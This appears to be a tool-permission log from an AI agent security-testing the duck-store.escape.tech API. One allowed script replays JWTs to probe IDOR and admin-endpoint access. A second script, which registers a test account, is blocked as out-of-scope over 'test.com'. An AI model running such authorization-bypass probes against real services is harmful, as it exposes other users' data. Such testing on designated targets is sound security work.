{"ts": 1790647117.8737886, "decision_id": "558db199106b", "tool": "run_shell", "allow": true, "reason": null, "target": "cat > /tmp/jwt_test3.py << 'PYEOF'\nimport jwt\nimport json\nimport base64\nimport requests\nimport sys\n\n# Original tokens\ntoken_a = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k\"\ntoken_b = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk3OWRhNjgtNzMzNS00ZTdhLWEzMmUtYWU5ZDVlOTA3NTk2IiwidXNlcm5hbWUiOiJ1c2VyX2JfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxNDF9.HimXkMB6-ISFzFcW56DBNFVIAOH6uldXNEHQJjuZY1A\"\n\nBASE = \"https://duck-store.escape.tech/api/v1\"\n\n# Test /auth/me with original tokens\nprint(\"Testing /auth/me with original tokens:\")\nfor name, token in [(\"user_a\", token_a), (\"user_b\", token_b)]:\n    r = requests.get(f\"{BASE}/auth/me\", headers={\"Authorization\": f\"Bearer {token}\"}, timeout=10, verify=False)\n    print(f\"  {name}: {r.status_code} - {r.text}\")\n\n# Test IDOR on /users/{user_uuid}\nprint(\"\\nTesting IDOR on /users/{user_uuid}:\")\nuser_a_id = \"1c0efab7-49fd-4c70-b725-33b84d076b27\"\nuser_b_id = \"1979da68-7335-4e7a-a32e-ae9d5e907596\"\n\n# user_a accessing user_b's profile\nr = requests.get(f\"{BASE}/users/{user_b_id}\", headers={\"Authorization\": f\"Bearer {token_a}\"}, timeout=10, verify=False)\nprint(f\"  user_a accessing user_b: {r.status_code} - {r.text}\")\n\n# user_b accessing user_a's profile\nr = requests.get(f\"{BASE}/users/{user_a_id}\", headers={\"Authorization\": f\"Bearer {token_b}\"}, timeout=10, verify=False)\nprint(f\"  user_b accessing user_a: {r.status_code} - {r.text}\")\n\n# Test admin endpoints with original tokens\nprint(\"\\nTesting admin endpoints:\")\nfor name, token in [(\"user_a\", token_a), (\"user_b\", token_b)]:\n    for ep in [\"/admin/stats\", \"/admin/recent-orders\", \"/admin/users\", \"/admin/products\"]:\n        r = requests.get(f\"{BASE}{ep}\", headers={\"Authorization\": f\"Bearer {token}\"}, timeout=10, verify=False)\n        print(f\"  {name} -> {ep}: {r.status_code} - {r.text[:100]}\")\n\n# Test users/me/profile\nprint(\"\\nTesting /users/me/profile:\")\nfor name, token in [(\"user_a\", token_a), (\"user_b\", token_b)]:\n    r = requests.get(f\"{BASE}/users/me/profile\", headers={\"Authorization\": f\"Bearer {token}\"}, timeout=10, verify=False)\n    print(f\"  {name}: {r.status_code} - {r.text[:200]}\")\n\nPYEOF\npython3 /tmp/jwt_test3.py 2>&1 | grep -v \"InsecureRequestWarning\" | grep -v \"warnings.warn\""}
{"ts": 1790647137.0392218, "decision_id": "c14a9224c0c0", "tool": "run_shell", "allow": false, "reason": "out-of-scope target blocked: test.com", "target": "cat > /tmp/jwt_test4.py << 'PYEOF'\nimport jwt\nimport json\nimport base64\nimport time\n\ntoken_a = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k\"\ntoken_b = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk3OWRhNjgtNzMzNS00ZTdhLWEzMmUtYWU5ZDVlOTA3NTk2IiwidXNlcm5hbWUiOiJ1c2VyX2JfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxNDF9.HimXkMB6-ISFzFcW56DBNFVIAOH6uldXNEHQJjuZY1A\"\n\n# Check expiration\nnow = int(time.time())\nfor name, token in [(\"user_a\", token_a), (\"user_b\", token_b)]:\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode())\n    exp = payload.get('exp', 0)\n    print(f\"{name}: exp={exp}, now={now}, valid={exp > now}, expires in={exp-now} seconds\")\n\n# Try to register a new user and login to get fresh tokens\nprint(\"\\nTrying to register new user...\")\nimport requests\nr = requests.post(\"https://duck-store.escape.tech/api/v1/auth/register\", \n    json={\"username\": \"testuser123\", \"email\": \"test123@test.com\", \"password\": \"TestPass123!\"}, \n    timeout=10, verify=False)\nprint(f\"Register: {r.status_code} - {r.text}\")\n\nr = requests.post(\"https://duck-store.escape.tech/api/v1/auth/login\", \n    json={\"username\": \"testuser123\", \"password\": \"TestPass123!\"}, \n    timeout=10, verify=False)\nprint(f\"Login: {r.status_code} - {r.text}\")\n\nif r.status_code == 200:\n    new_token = r.json().get('access_token')\n    print(f\"New token: {new_token}\")\n    # Test with new token\n    r = requests.get(\"https://duck-store.escape.tech/api/v1/auth/me\", \n        headers={\"Authorization\": f\"Bearer {new_token}\"}, timeout=10, verify=False)\n    print(f\"/auth/me with new token: {r.status_code} - {r.text}\")\n\nPYEOF\npython3 /tmp/jwt_test4.py 2>&1 | grep -v \"InsecureRequestWarning\" | grep -v \"warnings.warn\""}
